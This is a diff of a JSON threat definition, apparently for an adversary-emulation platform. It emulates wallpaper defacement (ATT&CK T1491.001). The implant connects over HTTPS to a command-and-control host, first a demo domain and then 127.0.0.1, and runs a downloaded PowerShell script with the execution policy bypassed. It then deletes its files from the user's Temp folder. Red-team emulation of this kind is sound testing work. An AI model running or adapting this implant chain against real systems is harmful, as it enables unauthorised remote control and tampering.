@@ -1,18 +1,19 @@
 {
     "threat": {
         "category": "User-Defined",
-        "description": "Background Changes with Cleanup",
-        "display_name": "BGChangeThreat",
-        "name": "BGChangeThreat",
+        "description": "Changes desktop wallpaper",
+        "display_name": "T1491_001 - Change Wallpaper",
+        "name": "T1491_001 - Change Wallpaper",
         "operating_system_name": "windows",
         "script": {
             "0": {
-                "conf": "{\"--cp\":\"icsvillage.scythedemo.com:443\",\"--secure\":true}",
+                "conf": "{\"--cp\":\"127.0.0.1:443\",\"--secure\":true,\"--multipart\":10240,\"--heartbeat\":1}",
                 "module": "https",
                 "type": "initialization"
             },
             "1": {
                 "module": "loader",
+                "module_to_load": "downloader",
                 "request": "--load downloader",
                 "type": "message"
             },
@@ -28,6 +29,7 @@
             },
             "4": {
                 "module": "loader",
+                "module_to_load": "run",
                 "request": "--load run",
                 "type": "message"
             },
@@ -37,24 +39,19 @@
                 "type": "message"
             },
             "6": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
                 "module": "run",
-                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/wallchange.ps1\"",
+                "request": "powershell -executionpolicy bypass -file \"%USERPROFILE%/AppData/Local/Temp/wallchange.ps1\"",
                 "type": "message"
             },
             "7": {
                 "module": "run",
-                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/desktop.jpg\"",
+                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/wallchange.ps1\"",
                 "type": "message"
             },
             "8": {
-                "module": "controller",
-                "request": "--shutdown",
-                "rtags": [
-                    "scythe",
-                    "att&ck",
-                    "att&ck-tactic:TA0011",
-                    "att&ck-technique:T1219"
-                ],
+                "module": "run",
+                "request": "powershell Remove-Item \"%USERPROFILE%/AppData/Local/Temp/desktop.jpg\"",
                 "type": "message"
             }
         },
